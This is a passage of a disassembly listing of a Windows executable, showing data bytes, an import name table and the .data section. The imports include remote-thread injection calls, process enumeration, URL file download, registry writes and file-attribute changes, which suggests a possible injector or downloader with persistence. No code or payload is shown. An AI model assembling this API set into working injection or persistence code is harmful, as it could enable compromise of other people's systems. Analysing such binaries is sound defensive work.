.rdata:00403A35                 db    0
.rdata:00403A36                 db    0
.rdata:00403A37                 db    0
.rdata:00403A38                 db 0C2h
.rdata:00403A39                 db  3Dh ; =
.rdata:00403A3A                 db    0
.rdata:00403A3B                 db    0
.rdata:00403A3C                 db    0
.rdata:00403A3D                 db    0
.rdata:00403A3E                 db    0
.rdata:00403A3F                 db    0
.rdata:00403A40                 db  7Ah ; z
.rdata:00403A41                 db  3Eh ; >
.rdata:00403A42                 db    0
.rdata:00403A43                 db    0
.rdata:00403A44                 db  34h ; 4
.rdata:00403A45                 db  3Eh ; >
.rdata:00403A46                 db    0
.rdata:00403A47                 db    0
.rdata:00403A48                 db  92h
.rdata:00403A49                 db  3Eh ; >
.rdata:00403A4A                 db    0
.rdata:00403A4B                 db    0
.rdata:00403A4C                 db  9Ch
.rdata:00403A4D                 db  3Eh ; >
.rdata:00403A4E                 db    0
.rdata:00403A4F                 db    0
.rdata:00403A50                 db  6Ch ; l
.rdata:00403A51                 db  3Eh ; >
.rdata:00403A52                 db    0
.rdata:00403A53                 db    0
.rdata:00403A54                 db  12h
.rdata:00403A55                 db  3Eh ; >
.rdata:00403A56                 db    0
.rdata:00403A57                 db    0
.rdata:00403A58                 db 0F0h
.rdata:00403A59                 db  3Dh ; =
.rdata:00403A5A                 db    0
.rdata:00403A5B                 db    0
.rdata:00403A5C                 db  40h ; @
.rdata:00403A5D                 db  3Eh ; >
.rdata:00403A5E                 db    0
.rdata:00403A5F                 db    0
.rdata:00403A60                 db    0
.rdata:00403A61                 db  3Fh ; ?
.rdata:00403A62                 db    0
.rdata:00403A63                 db    0
.rdata:00403A64                 db  1Ch
.rdata:00403A65                 db  3Fh ; ?
.rdata:00403A66                 db    0
.rdata:00403A67                 db    0
.rdata:00403A68                 db  38h ; 8
.rdata:00403A69                 db  3Fh ; ?
.rdata:00403A6A                 db    0
.rdata:00403A6B                 db    0
.rdata:00403A6C                 db  46h ; F
.rdata:00403A6D                 db  3Fh ; ?
.rdata:00403A6E                 db    0
.rdata:00403A6F                 db    0
.rdata:00403A70                 db  56h ; V
.rdata:00403A71                 db  3Fh ; ?
.rdata:00403A72                 db    0
.rdata:00403A73                 db    0
.rdata:00403A74                 db 0D6h
.rdata:00403A75                 db  3Dh ; =
.rdata:00403A76                 db    0
.rdata:00403A77                 db    0
.rdata:00403A78                 db  56h ; V
.rdata:00403A79                 db  3Eh ; >
.rdata:00403A7A                 db    0
.rdata:00403A7B                 db    0
.rdata:00403A7C                 db 0B2h
.rdata:00403A7D                 db  3Dh ; =
.rdata:00403A7E                 db    0
.rdata:00403A7F                 db    0
.rdata:00403A80                 db  4Eh ; N
.rdata:00403A81                 db  3Eh ; >
.rdata:00403A82                 db    0
.rdata:00403A83                 db    0
.rdata:00403A84                 db  88h
.rdata:00403A85                 db  3Eh ; >
.rdata:00403A86                 db    0
.rdata:00403A87                 db    0
.rdata:00403A88                 db 0A0h
.rdata:00403A89                 db  3Dh ; =
.rdata:00403A8A                 db    0
.rdata:00403A8B                 db    0
.rdata:00403A8C                 db    0
.rdata:00403A8D                 db    0
.rdata:00403A8E                 db    0
.rdata:00403A8F                 db    0
.rdata:00403A90                 db  86h
.rdata:00403A91                 db  3Dh ; =
.rdata:00403A92                 db    0
.rdata:00403A93                 db    0
.rdata:00403A94                 db  5Ch ; \
.rdata:00403A95                 db  3Dh ; =
.rdata:00403A96                 db    0
.rdata:00403A97                 db    0
.rdata:00403A98                 db  5Eh ; ^
.rdata:00403A99                 db  3Eh ; >
.rdata:00403A9A                 db    0
.rdata:00403A9B                 db    0
.rdata:00403A9C                 db 0F0h
.rdata:00403A9D                 db  3Eh ; >
.rdata:00403A9E                 db    0
.rdata:00403A9F                 db    0
.rdata:00403AA0                 db    0
.rdata:00403AA1                 db    0
.rdata:00403AA2                 db    0
.rdata:00403AA3                 db    0
.rdata:00403AA4                 db  7Ah ; z
.rdata:00403AA5                 db  3Dh ; =
.rdata:00403AA6                 db    0
.rdata:00403AA7                 db    0
.rdata:00403AA8                 db  6Eh ; n
.rdata:00403AA9                 db  3Dh ; =
.rdata:00403AAA                 db    0
.rdata:00403AAB                 db    0
.rdata:00403AAC                 db    0
.rdata:00403AAD                 db    0
.rdata:00403AAE                 db    0
.rdata:00403AAF                 db    0
.rdata:00403AB0                 db 0D0h
.rdata:00403AB1                 db  3Ch ; <
.rdata:00403AB2                 db    0
.rdata:00403AB3                 db    0
.rdata:00403AB4                 db    0
.rdata:00403AB5                 db    0
.rdata:00403AB6                 db    0
.rdata:00403AB7                 db    0
.rdata:00403AB8                 dw 0
.rdata:00403ABA                 db 'SizeofResource',0
.rdata:00403AC9                 align 2
.rdata:00403ACA                 dw 0
.rdata:00403ACC                 db 'WriteProcessMemory',0
.rdata:00403ADF                 align 10h
.rdata:00403AE0                 dw 0
.rdata:00403AE2                 db 'WriteFile',0
.rdata:00403AEC                 dw 0
.rdata:00403AEE                 db 'GetModuleFileNameW',0
.rdata:00403B01                 align 2
.rdata:00403B02                 dw 0
.rdata:00403B04                 db 'CreateFileW',0
.rdata:00403B10                 dw 0
.rdata:00403B12                 db 'OpenProcess',0
.rdata:00403B1E                 dw 0
.rdata:00403B20                 db 'SetFileAttributesW',0
.rdata:00403B33                 align 4
.rdata:00403B34                 dw 0
.rdata:00403B36                 db 'CreateToolhelp32Snapshot',0
.rdata:00403B4F                 align 10h
.rdata:00403B50                 dw 0
.rdata:00403B52                 db 'Process32NextW',0
.rdata:00403B61                 align 2
.rdata:00403B62                 dw 0
.rdata:00403B64                 db 'LockResource',0
.rdata:00403B71                 align 2
.rdata:00403B72                 dw 0
.rdata:00403B74                 db 'Process32FirstW',0
.rdata:00403B84                 dw 0
.rdata:00403B86                 db 'CloseHandle',0
.rdata:00403B92                 dw 0
.rdata:00403B94                 db 'LoadResource',0
.rdata:00403BA1                 align 2
.rdata:00403BA2                 dw 0
.rdata:00403BA4                 db 'FindResourceW',0
.rdata:00403BB2                 dw 0
.rdata:00403BB4                 db 'GetProcAddress',0
.rdata:00403BC3                 align 4
.rdata:00403BC4                 dw 0
.rdata:00403BC6                 db 'VirtualAllocEx',0
.rdata:00403BD5                 align 2
.rdata:00403BD6                 dw 0
.rdata:00403BD8                 db 'GetModuleHandleW',0
.rdata:00403BE9                 align 2
.rdata:00403BEA                 dw 0
.rdata:00403BEC                 db 'CopyFileW',0
.rdata:00403BF6                 dw 0
.rdata:00403BF8                 db 'CreateRemoteThread',0
.rdata:00403C0B                 align 4
.rdata:00403C0C                 dw 0
.rdata:00403C0E                 db 'VirtualFreeEx',0
.rdata:00403C1C                 dw 0
.rdata:00403C1E                 db 'AllocConsole',0
.rdata:00403C2B                 align 4
.rdata:00403C2C aKernel32Dll    db 'KERNEL32.DLL',0     ; DATA XREF: .rdata:00403870↑o
.rdata:00403C39                 align 2
.rdata:00403C3A                 dw 0
.rdata:00403C3C                 db 'FindWindowA',0
.rdata:00403C48                 dw 0
.rdata:00403C4A                 db 'ShowWindow',0
.rdata:00403C55                 align 2
.rdata:00403C56 aUser32Dll      db 'USER32.dll',0       ; DATA XREF: .rdata:00403938↑o
.rdata:00403C61                 align 2
.rdata:00403C62                 dw 0
.rdata:00403C64                 db 'RegOpenKeyExW',0
.rdata:00403C72                 dw 0
.rdata:00403C74                 db 'RegSetValueExW',0
.rdata:00403C83                 align 4
.rdata:00403C84                 dw 0
.rdata:00403C86                 db 'RegCloseKey',0
.rdata:00403C92 aAdvapi32Dll    db 'ADVAPI32.dll',0     ; DATA XREF: .rdata:00403884↑o
.rdata:00403C9F                 align 10h
.rdata:00403CA0                 dw 0
.rdata:00403CA2                 db 'ShellExecuteW',0
.rdata:00403CB0                 dw 0
.rdata:00403CB2                 db 'SHGetFolderPathW',0
.rdata:00403CC3                 align 4
.rdata:00403CC4 aShell32Dll     db 'SHELL32.dll',0      ; DATA XREF: .rdata:00403910↑o
.rdata:00403CD0                 dw 0
.rdata:00403CD2                 db 'URLDownloadToFileW',0
.rdata:00403CE5                 align 2
.rdata:00403CE6 aUrlmonDll      db 'urlmon.dll',0       ; DATA XREF: .rdata:00403924↑o
.rdata:00403CF1                 align 2
.rdata:00403CF2                 dw 0
.rdata:00403CF4                 db '__current_exception',0
.rdata:00403D08                 dw 0
.rdata:00403D0A                 db '__current_exception_context',0
.rdata:00403D26                 dw 0
.rdata:00403D28                 db 'memset',0
.rdata:00403D2F                 align 10h
.rdata:00403D30                 dw 0
.rdata:00403D32                 db '_except_handler4_common',0
.rdata:00403D4A aVcruntime140Dl db 'VCRUNTIME140.dll',0 ; DATA XREF: .rdata:0040394C↑o
.rdata:00403D5B                 align 4
.rdata:00403D5C                 dw 0
.rdata:00403D5E                 db '__acrt_iob_func',0
.rdata:00403D6E                 dw 0
.rdata:00403D70                 db '_wcsicmp',0
.rdata:00403D79                 align 2
.rdata:00403D7A                 dw 0
.rdata:00403D7C                 db 'wcscat_s',0
.rdata:00403D85                 align 2
.rdata:00403D86                 dw 0
.rdata:00403D88                 db '__stdio_common_vfprintf',0
.rdata:00403DA0                 dw 0
.rdata:00403DA2                 db '_seh_filter_exe',0
.rdata:00403DB2                 dw 0
.rdata:00403DB4                 db '_set_app_type',0
.rdata:00403DC2                 dw 0
.rdata:00403DC4                 db '__setusermatherr',0
.rdata:00403DD5                 align 2
.rdata:00403DD6                 dw 0
.rdata:00403DD8                 db '_configure_narrow_argv',0
.rdata:00403DEF                 align 10h
.rdata:00403DF0                 dw 0
.rdata:00403DF2                 db '_initialize_narrow_environment',0
.rdata:00403E11                 align 2
.rdata:00403E12                 dw 0
.rdata:00403E14                 db '_get_initial_narrow_environment',0
.rdata:00403E34                 dw 0
.rdata:00403E36                 db '_initterm',0
.rdata:00403E40                 dw 0
.rdata:00403E42                 db '_initterm_e',0
.rdata:00403E4E                 dw 0
.rdata:00403E50                 db 'exit',0
.rdata:00403E55                 align 2
.rdata:00403E56                 dw 0
.rdata:00403E58                 db '_exit',0
.rdata:00403E5E                 dw 0
.rdata:00403E60                 db '_set_fmode',0
.rdata:00403E6B                 align 4
.rdata:00403E6C                 dw 0
.rdata:00403E6E                 db '__p___argc',0
.rdata:00403E79                 align 2
.rdata:00403E7A                 dw 0
.rdata:00403E7C                 db '__p___argv',0
.rdata:00403E87                 align 4
.rdata:00403E88                 dw 0
.rdata:00403E8A                 db '_cexit',0
.rdata:00403E91                 align 2
.rdata:00403E92                 dw 0
.rdata:00403E94                 db '_c_exit',0
.rdata:00403E9C                 dw 0
.rdata:00403E9E                 db '_register_thread_local_exe_atexit_callback',0
.rdata:00403EC9                 align 2
.rdata:00403ECA                 dw 0
.rdata:00403ECC                 db '_configthreadlocale',0
.rdata:00403EE0                 dw 0
.rdata:00403EE2                 db '_set_new_mode',0
.rdata:00403EF0                 dw 0
.rdata:00403EF2                 db '__p__commode',0
.rdata:00403EFF                 align 10h
.rdata:00403F00                 dw 0
.rdata:00403F02                 db '_initialize_onexit_table',0
.rdata:00403F1B                 align 4
.rdata:00403F1C                 dw 0
.rdata:00403F1E                 db '_register_onexit_function',0
.rdata:00403F38                 dw 0
.rdata:00403F3A                 db '_crt_atexit',0
.rdata:00403F46                 dw 0
.rdata:00403F48                 db '_controlfp_s',0
.rdata:00403F55                 align 2
.rdata:00403F56                 dw 0
.rdata:00403F58                 db 'terminate',0
.rdata:00403F62 aApiMsWinCrtStd db 'api-ms-win-crt-stdio-l1-1-0.dll',0
.rdata:00403F62                                         ; DATA XREF: .rdata:004038E8↑o
.rdata:00403F82 aApiMsWinCrtStr db 'api-ms-win-crt-string-l1-1-0.dll',0
.rdata:00403F82                                         ; DATA XREF: .rdata:004038FC↑o
.rdata:00403FA3                 align 4
.rdata:00403FA4 aApiMsWinCrtRun db 'api-ms-win-crt-runtime-l1-1-0.dll',0
.rdata:00403FA4                                         ; DATA XREF: .rdata:004038D4↑o
.rdata:00403FC6 aApiMsWinCrtMat db 'api-ms-win-crt-math-l1-1-0.dll',0
.rdata:00403FC6                                         ; DATA XREF: .rdata:004038C0↑o
.rdata:00403FE5                 align 2
.rdata:00403FE6 aApiMsWinCrtLoc db 'api-ms-win-crt-locale-l1-1-0.dll',0
.rdata:00403FE6                                         ; DATA XREF: .rdata:004038AC↑o
.rdata:00404007                 align 4
.rdata:00404008 aApiMsWinCrtHea db 'api-ms-win-crt-heap-l1-1-0.dll',0
.rdata:00404008                                         ; DATA XREF: .rdata:00403898↑o
.rdata:00404027                 align 4
.rdata:00404028                 dw 0
.rdata:0040402A                 db 'UnhandledExceptionFilter',0
.rdata:00404043                 align 4
.rdata:00404044                 dw 0
.rdata:00404046                 db 'SetUnhandledExceptionFilter',0
.rdata:00404062                 dw 0
.rdata:00404064                 db 'GetCurrentProcess',0
.rdata:00404076                 dw 0
.rdata:00404078                 db 'TerminateProcess',0
.rdata:00404089                 align 2
.rdata:0040408A                 dw 0
.rdata:0040408C                 db 'IsProcessorFeaturePresent',0
.rdata:004040A6                 dw 0
.rdata:004040A8                 db 'QueryPerformanceCounter',0
.rdata:004040C0                 dw 0
.rdata:004040C2                 db 'GetCurrentProcessId',0
.rdata:004040D6                 dw 0
.rdata:004040D8                 db 'GetCurrentThreadId',0
.rdata:004040EB                 align 4
.rdata:004040EC                 dw 0
.rdata:004040EE                 db 'GetSystemTimeAsFileTime',0
.rdata:00404106                 dw 0
.rdata:00404108                 db 'InitializeSListHead',0
.rdata:0040411C                 dw 0
.rdata:0040411E                 db 'IsDebuggerPresent',0
.rdata:00404130                 align 1000h
.rdata:00404130 _rdata          ends
.rdata:00404130
.data:00405000 ; Section 3. (virtual address 00005000)
.data:00405000 ; Virtual size                  : 000003D0 (    976.)
.data:00405000 ; Section size in file          : 00000200 (    512.)
.data:00405000 ; Offset to raw data for section: 00002800
.data:00405000 ; Flags C0000040: Data Readable Writable
.data:00405000 ; Alignment     : default
.data:00405000 ; ===========================================================================
.data:00405000
.data:00405000 ; Segment type: Pure data
.data:00405000 ; Segment permissions: Read/Write
.data:00405000 _data           segment para public 'DATA' use32
.data:00405000                 assume cs:_data
.data:00405000                 ;org 405000h
.data:00405000 ; uintptr_t __security_cookie
.data:00405000 ___security_cookie dd 0BB40E64Eh        ; DATA XREF: _main+9↑r
.data:00405000                                         ; __security_check_cookie(x)↑r ...
.data:00405004                 align 40h
.data:00405040 dword_405040    dd 44BF19B1h            ; DATA XREF: ___report_gsfailure+E4↑r
.data:00405040                                         ; ___security_init_cookie+43↑w
.data:00405044                 db 0FFh
.data:00405045                 db 0FFh
.data:00405046                 db 0FFh
.data:00405047                 db 0FFh
.data:00405048 dword_405048    dd 1                    ; DATA XREF: sub_401A62+2↑r
.data:0040504C                 align 10h
.data:00405050 dword_405050    dd 0FFFFFFFFh           ; DATA XREF: sub_401D14+168↑r
.data:00405050                                         ; sub_401D14+189↑w ...
.data:00405054 dword_405054    dd 0FFFFFFFFh           ; DATA XREF: sub_401D14+171↑r
.data:00405054                                         ; sub_401D14+18F↑w ...
.data:00405058 dword_405058    dd 1                    ; DATA XREF: sub_401D14+D↑w
.data:00405058                                         ; sub_401D14:loc_401E77↑r ...
.data:0040505C dword_40505C    dd 1                    ; DATA XREF: ___scrt_is_ucrt_dll_in_use+2↑r
.data:00405060 dword_405060    dd 0                    ; DATA XREF: ___report_gsfailure+A0↑w
.data:00405060                                         ; .rdata:ExceptionInfo↑o
.data:00405064 dword_405064    dd 0                    ; DATA XREF: ___report_gsfailure+AA↑w
.data:00405068                 db    0
.data:00405069                 db    0
.data:0040506A                 db    0
.data:0040506B                 db    0
.data:0040506C dword_40506C    dd 0                    ; DATA XREF: ___report_gsfailure+9B↑w
.data:00405070 dword_405070    dd 0                    ; DATA XREF: ___report_gsfailure+B4↑w
.data:00405074 dword_405074    dd 0                    ; DATA XREF: ___report_gsfailure+C4↑w
.data:00405078                 db    0
.data:00405079                 db    0
.data:0040507A                 db    0
.data:0040507B                 db    0
.data:0040507C                 db    0
.data:0040507D                 db    0
.data:0040507E                 db    0
.data:0040507F                 db    0
.data:00405080                 db    0
.data:00405081                 db    0
.data:00405082                 db    0
.data:00405083                 db    0
.data:00405084                 db    0
.data:00405085                 db    0
.data:00405086                 db    0
.data:00405087                 db    0
.data:00405088                 db    0
.data:00405089                 db    0
.data:0040508A                 db    0
.data:0040508B                 db    0
.data:0040508C                 db    0
.data:0040508D                 db    0
.data:0040508E                 db    0
.data:0040508F                 db    0
.data:00405090                 db    0
.data:00405091                 db    0
.data:00405092                 db    0
.data:00405093                 db    0
.data:00405094                 db    0
.data:00405095                 db    0
.data:00405096                 db    0
.data:00405097                 db    0
.data:00405098                 db    0
.data:00405099                 db    0
.data:0040509A                 db    0
.data:0040509B                 db    0
.data:0040509C                 db    0
.data:0040509D                 db    0
.data:0040509E                 db    0
.data:0040509F                 db    0
.data:004050A0                 db    0
.data:004050A1                 db    0
.data:004050A2                 db    0
.data:004050A3                 db    0
.data:004050A4                 db    0
.data:004050A5                 db    0
.data:004050A6                 db    0
.data:004050A7                 db    0
.data:004050A8                 db    0
.data:004050A9                 db    0
.data:004050AA                 db    0
.data:004050AB                 db    0
.data:004050AC                 db    0
.data:004050AD                 db    0
.data:004050AE                 db    0
.data:004050AF                 db    0
.data:004050B0 dword_4050B0    dd 0                    ; DATA XREF: ___report_gsfailure+8C↑w
.data:004050B0                                         ; .rdata:ExceptionInfo↑o
.data:004050B4                 db    0
.data:004050B5                 db    0
.data:004050B6                 db    0
.data:004050B7                 db    0
.data:004050B8                 db    0
.data:004050B9                 db    0
.data:004050BA                 db    0
.data:004050BB                 db    0
.data:004050BC                 db    0
.data:004050BD                 db    0
.data:004050BE                 db    0
.data:004050BF                 db    0
.data:004050C0                 db    0
.data:004050C1                 db    0
.data:004050C2                 db    0
.data:004050C3                 db    0
.data:004050C4                 db    0
.data:004050C5                 db    0
.data:004050C6                 db    0
.data:004050C7                 db    0
.data:004050C8                 db    0
.data:004050C9                 db    0
.data:004050CA                 db    0
.data:004050CB                 db    0
.data:004050CC                 db    0
.data:004050CD                 db    0
.data:004050CE                 db    0
.data:004050CF                 db    0
.data:004050D0                 db    0
.data:004050D1                 db    0
.data:004050D2                 db    0
.data:004050D3                 db    0
.data:004050D4                 db    0
.data:004050D5                 db    0
.data:004050D6                 db    0
.data:004050D7                 db    0
.data:004050D8                 db    0
.data:004050D9                 db    0
.data:004050DA                 db    0
.data:004050DB                 db    0
.data:004050DC                 db    0
.data:004050DD                 db    0
.data:004050DE                 db    0
.data:004050DF                 db    0
.data:004050E0                 db    0
.data:004050E1                 db    0
.data:004050E2                 db    0
.data:004050E3                 db    0
.data:004050E4                 db    0
.data:004050E5                 db    0
.data:004050E6                 db    0
.data:004050E7                 db    0
.data:004050E8                 db    0
.data:004050E9                 db    0
.data:004050EA                 db    0
.data:004050EB                 db    0
.data:004050EC                 db    0
.data:004050ED                 db    0
.data:004050EE                 db    0
.data:004050EF                 db    0
.data:004050F0                 db    0
.data:004050F1                 db    0
.data:004050F2                 db    0
.data:004050F3                 db    0
.data:004050F4                 db    0
.data:004050F5                 db    0
.data:004050F6                 db    0
.data:004050F7                 db    0
.data:004050F8                 db    0
.data:004050F9                 db    0
.data:004050FA                 db    0
.data:004050FB                 db    0
.data:004050FC                 db    0
.data:004050FD                 db    0
.data:004050FE                 db    0
.data:004050FF                 db    0
.data:00405100                 db    0
.data:00405101                 db    0
.data:00405102                 db    0
.data:00405103                 db    0
.data:00405104                 db    0
.data:00405105                 db    0
.data:00405106                 db    0
.data:00405107                 db    0
.data:00405108                 db    0
.data:00405109                 db    0
.data:0040510A                 db    0
.data:0040510B                 db    0
.data:0040510C                 db    0
.data:0040510D                 db    0
.data:0040510E                 db    0
.data:0040510F                 db    0
.data:00405110                 db    0
.data:00405111                 db    0
.data:00405112                 db    0
.data:00405113                 db    0
.data:00405114                 db    0
.data:00405115                 db    0
.data:00405116                 db    0
.data:00405117                 db    0
.data:00405118                 db    0
.data:00405119                 db    0
.data:0040511A                 db    0
.data:0040511B                 db    0
.data:0040511C                 db    0
.data:0040511D                 db    0
.data:0040511E                 db    0
.data:0040511F                 db    0
.data:00405120                 db    0
.data:00405121                 db    0
.data:00405122                 db    0
.data:00405123                 db    0
.data:00405124                 db    0
.data:00405125                 db    0
.data:00405126                 db    0
.data:00405127                 db    0
.data:00405128                 db    0
.data:00405129                 db    0
.data:0040512A                 db    0
.data:0040512B                 db    0
.data:0040512C                 db    0
.data:0040512D                 db    0
.data:0040512E                 db    0
.data:0040512F                 db    0
.data:00405130                 db    0
.data:00405131                 db    0
.data:00405132                 db    0
.data:00405133                 db    0
.data:00405134                 db    0
.data:00405135                 db    0
.data:00405136                 db    0
.data:00405137                 db    0
.data:00405138                 db    0
.data:00405139                 db    0
.data:0040513A                 db    0
.data:0040513B                 db    0
.data:0040513C word_40513C     dw 0                    ; DATA XREF: ___report_gsfailure+60↑w
.data:0040513E                 align 10h
.data:00405140 word_405140     dw 0                    ; DATA XREF: ___report_gsfailure+59↑w
.data:00405142                 align 4
.data:00405144 word_405144     dw 0                    ; DATA XREF: ___report_gsfailure+52↑w
.data:00405146                 align 4
.data:00405148 word_405148     dw 0                    ; DATA XREF: ___report_gsfailure+4B↑w
.data:0040514A                 align 4
.data:0040514C dword_40514C    dd 0                    ; DATA XREF: ___report_gsfailure+37↑w
.data:00405150 dword_405150    dd 0                    ; DATA XREF: ___report_gsfailure+31↑w
.data:00405154 dword_405154    dd 0                    ; DATA XREF: ___report_gsfailure+2B↑w
.data:00405158 dword_405158    dd 0                    ; DATA XREF: ___report_gsfailure+25↑w
.data:0040515C dword_40515C    dd 0                    ; DATA XREF: ___report_gsfailure+1F↑w
.data:00405160 dword_405160    dd 0                    ; DATA XREF: ___report_gsfailure:loc_401635↑w
.data:00405164 dword_405164    dd 0                    ; DATA XREF: ___report_gsfailure+71↑w
.data:00405168 dword_405168    dd 0                    ; DATA XREF: ___report_gsfailure+79↑w
.data:00405168                                         ; ___report_gsfailure+96↑r
.data:0040516C word_40516C     dw 0                    ; DATA XREF: ___report_gsfailure+44↑w
.data:0040516E                 align 10h
.data:00405170 dword_405170    dd 0                    ; DATA XREF: ___report_gsfailure+68↑w
.data:00405174 dword_405174    dd 0                    ; DATA XREF: ___report_gsfailure+81↑w
.data:00405178 word_405178     dw 0                    ; DATA XREF: ___report_gsfailure+3D↑w
.data:0040517A                 db    0
.data:0040517B                 db    0
.data:0040517C                 db    0
.data:0040517D                 db    0
.data:0040517E                 db    0
.data:0040517F                 db    0
.data:00405180                 db    0
.data:00405181                 db    0
.data:00405182                 db    0
.data:00405183                 db    0
.data:00405184                 db    0
.data:00405185                 db    0
.data:00405186                 db    0
.data:00405187                 db    0
.data:00405188                 db    0
.data:00405189                 db    0
.data:0040518A                 db    0
.data:0040518B                 db    0
.data:0040518C                 db    0
.data:0040518D                 db    0
.data:0040518E                 db    0
.data:0040518F                 db    0
.data:00405190                 db    0
.data:00405191                 db    0
.data:00405192                 db    0
.data:00405193                 db    0
.data:00405194                 db    0
.data:00405195                 db    0
.data:00405196                 db    0
.data:00405197                 db    0
.data:00405198                 db    0
.data:00405199                 db    0
.data:0040519A                 db    0
.data:0040519B                 db    0
.data:0040519C                 db    0
.data:0040519D                 db    0
.data:0040519E                 db    0
.data:0040519F                 db    0
.data:004051A0                 db    0
.data:004051A1                 db    0
.data:004051A2                 db    0
.data:004051A3                 db    0
.data:004051A4                 db    0
.data:004051A5                 db    0
.data:004051A6                 db    0
.data:004051A7                 db    0
.data:004051A8                 db    0
.data:004051A9                 db    0
.data:004051AA                 db    0
.data:004051AB                 db    0
.data:004051AC                 db    0
.data:004051AD                 db    0
.data:004051AE                 db    0
.data:004051AF                 db    0
.data:004051B0                 db    0
.data:004051B1                 db    0
.data:004051B2                 db    0
.data:004051B3                 db    0
.data:004051B4                 db    0
.data:004051B5                 db    0
.data:004051B6                 db    0
.data:004051B7                 db    0
.data:004051B8                 db    0
.data:004051B9                 db    0
.data:004051BA                 db    0
.data:004051BB                 db    0
.data:004051BC                 db    0
.data:004051BD                 db    0
.data:004051BE                 db    0
.data:004051BF                 db    0
.data:004051C0                 db    0
.data:004051C1                 db    0
.data:004051C2                 db    0
.data:004051C3                 db    0
.data:004051C4                 db    0
.data:004051C5                 db    0
.data:004051C6                 db    0
.data:004051C7                 db    0
.data:004051C8                 db    0
.data:004051C9                 db    0
.data:004051CA                 db    0
.data:004051CB                 db    0
.data:004051CC                 db    0
.data:004051CD                 db    0
.data:004051CE                 db    0
.data:004051CF                 db    0
.data:004051D0                 db    0
.data:004051D1                 db    0
.data:004051D2                 db    0
.data:004051D3                 db    0
.data:004051D4                 db    0
.data:004051D5                 db    0
.data:004051D6                 db    0
.data:004051D7                 db    0
.data:004051D8                 db    0
.data:004051D9                 db    0
.data:004051DA                 db    0
.data:004051DB                 db    0
.data:004051DC                 db    0
.data:004051DD                 db    0
.data:004051DE                 db    0
.data:004051DF                 db    0
.data:004051E0                 db    0
.data:004051E1                 db    0
.data:004051E2                 db    0
.data:004051E3                 db    0
.data:004051E4                 db    0
.data:004051E5                 db    0
.data:004051E6                 db    0
.data:004051E7                 db    0
.data:004051E8                 db    0
.data:004051E9                 db    0
.data:004051EA                 db    0
.data:004051EB                 db    0
.data:004051EC                 db    0
.data:004051ED                 db    0
.data:004051EE                 db    0
.data:004051EF                 db    0
.data:004051F0                 db    0
.data:004051F1                 db    0
.data:004051F2                 db    0
.data:004051F3                 db    0
.data:004051F4                 db    0
.data:004051F5                 db    0
.data:004051F6                 db    0
.data:004051F7                 db    0
.data:004051F8                 db    0
.data:004051F9                 db    0
.data:004051FA                 db    0
.data:004051FB                 db    0
.data:004051FC                 db    0
.data:004051FD                 db    0
.data:004051FE                 db    0
.data:004051FF                 db    0
.data:00405200                 db    ? ;
.data:00405201                 db    ? ;
.data:00405202                 db    ? ;
.data:00405203                 db    ? ;
.data:00405204                 db    ? ;
.data:00405205                 db    ? ;
.data:00405206                 db    ? ;
.data:00405207                 db    ? ;
.data:00405208                 db    ? ;
.data:00405209                 db    ? ;
.data:0040520A                 db    ? ;
.data:0040520B                 db    ? ;
.data:0040520C                 db    ? ;
.data:0040520D                 db    ? ;
.data:0040520E                 db    ? ;
.data:0040520F                 db    ? ;
.data:00405210                 db    ? ;
.data:00405211                 db    ? ;
.data:00405212                 db    ? ;
.data:00405213                 db    ? ;
.data:00405214                 db    ? ;
.data:00405215                 db    ? ;
.data:00405216                 db    ? ;
.data:00405217                 db    ? ;
.data:00405218                 db    ? ;
.data:00405219                 db    ? ;
.data:0040521A                 db    ? ;
.data:0040521B                 db    ? ;
.data:0040521C                 db    ? ;
.data:0040521D                 db    ? ;
.data:0040521E                 db    ? ;
.data:0040521F                 db    ? ;
.data:00405220                 db    ? ;
.data:00405221                 db    ? ;
.data:00405222                 db    ? ;
.data:00405223                 db    ? ;
.data:00405224                 db    ? ;
.data:00405225                 db    ? ;
.data:00405226                 db    ? ;
.data:00405227                 db    ? ;
.data:00405228                 db    ? ;
.data:00405229                 db    ? ;
.data:0040522A                 db    ? ;
.data:0040522B                 db    ? ;
.data:0040522C                 db    ? ;
.data:0040522D                 db    ? ;
.data:0040522E                 db    ? ;
.data:0040522F                 db    ? ;
.data:00405230                 db    ? ;
.data:00405231                 db    ? ;
.data:00405232                 db    ? ;
.data:00405233                 db    ? ;
.data:00405234                 db    ? ;
.data:00405235                 db    ? ;
.data:00405236                 db    ? ;
.data:00405237                 db    ? ;
.data:00405238                 db    ? ;
.data:00405239                 db    ? ;
.data:0040523A                 db    ? ;
.data:0040523B                 db    ? ;
.data:0040523C                 db    ? ;
.data:0040523D                 db    ? ;
.data:0040523E                 db    ? ;
.data:0040523F                 db    ? ;
.data:00405240                 db    ? ;
.data:00405241                 db    ? ;
.data:00405242                 db    ? ;
.data:00405243                 db    ? ;
.data:00405244                 db    ? ;
.data:00405245                 db    ? ;
.data:00405246                 db    ? ;
.data:00405247                 db    ? ;
.data:00405248                 db    ? ;
.data:00405249                 db    ? ;
.data:0040524A                 db    ? ;
.data:0040524B                 db    ? ;
.data:0040524C                 db    ? ;
.data:0040524D                 db    ? ;
.data:0040524E                 db    ? ;
.data:0040524F                 db    ? ;
.data:00405250                 db    ? ;
.data:00405251                 db    ? ;
.data:00405252                 db    ? ;
.data:00405253                 db    ? ;
.data:00405254                 db    ? ;
.data:00405255                 db    ? ;
.data:00405256                 db    ? ;
.data:00405257                 db    ? ;
.data:00405258                 db    ? ;
.data:00405259                 db    ? ;
.data:0040525A                 db    ? ;
.data:0040525B                 db    ? ;
.data:0040525C                 db    ? ;
.data:0040525D                 db    ? ;
.data:0040525E                 db    ? ;
.data:0040525F                 db    ? ;
.data:00405260                 db    ? ;
.data:00405261                 db    ? ;
.data:00405262                 db    ? ;
.data:00405263                 db    ? ;
.data:00405264                 db    ? ;
.data:00405265                 db    ? ;
.data:00405266                 db    ? ;
.data:00405267                 db    ? ;
.data:00405268                 db    ? ;
.data:00405269                 db    ? ;
.data:0040526A                 db    ? ;
.data:0040526B                 db    ? ;
.data:0040526C                 db    ? ;
.data:0040526D                 db    ? ;
.data:0040526E                 db    ? ;
.data:0040526F                 db    ? ;
.data:00405270                 db    ? ;
.data:00405271                 db    ? ;
.data:00405272                 db    ? ;
.data:00405273                 db    ? ;
.data:00405274                 db    ? ;
.data:00405275                 db    ? ;
.data:00405276                 db    ? ;
.data:00405277                 db    ? ;
.data:00405278                 db    ? ;
.data:00405279                 db    ? ;
.data:0040527A                 db    ? ;
.data:0040527B                 db    ? ;
.data:0040527C                 db    ? ;
.data:0040527D                 db    ? ;
.data:0040527E                 db    ? ;
.data:0040527F                 db    ? ;
.data:00405280                 db    ? ;
.data:00405281                 db    ? ;
.data:00405282                 db    ? ;
